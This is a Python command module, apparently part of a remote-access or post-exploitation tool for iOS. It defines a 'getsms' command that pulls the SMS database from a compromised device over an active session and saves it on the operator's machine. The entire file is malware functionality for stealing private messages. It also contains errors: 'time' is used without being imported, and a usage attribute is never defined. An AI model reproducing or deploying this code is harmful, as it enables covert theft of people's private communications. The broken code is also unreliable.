#!/usr/bin/env python3

import json
import os
import core.helper as h

class command:
	def __init__(self):
		self.name = "getsms"
		self.description = "Get device SMS."

	def run(self,session,cmd_data):
		if len(cmd_data['args'].split()) < 1:
			print(self.usage)
			return
		
		dest = cmd_data['args'].split()[0]
		if os.path.isdir(dest):
			if os.path.exists(dest):
				h.info_general("Getting SMS...")
				data = session.download_file('/var/mobile/Library/SMS/sms.db')
				if data:
					f = open(os.path.join(dest,'sms.db'),'wb')
					f.write(data)
					f.close()
					if dest[-1] == "/":
						h.info_general("Saving to "+dest+"sms.db...")
						time.sleep(1)
						h.info_success("Saved to "+dest+"sms.db!")
					else:
						h.info_general("Saving to "+dest+"/sms.db...")
						time.sleep(1)
						h.info_success("Saved to "+dest+"/sms.db!")
				else:
					h.info_error("Failed to get SMS!")
			else:
				h.info_error("Local directory: "+dest+": does not exist!")
		else:
			rp = os.path.split(dest)[0]
			if rp == "":
				rp = "."
			else:
				pass
			if os.path.exists(rp):
				if os.path.isdir(rp):
					pr = os.path.split(dest)[0]
					rp = os.path.split(dest)[1]
					h.info_general("Getting SMS...")
					data = session.download_file('/var/mobile/Library/SMS/sms.db')
					if data:
						f = open(os.path.join(pr,rp),'wb')
						f.write(data)
						f.close()
						h.info_general("Saving to "+dest+"...")
						time.sleep(1)
						h.info_success("Saved to "+dest+"!")
					else:
						h.info_error("Failed to get SMS!")
				else:
					h.info_error("Error: "+rp+": not a directory!")
			else:
				h.info_error("Local directory: "+rp+": does not exist!")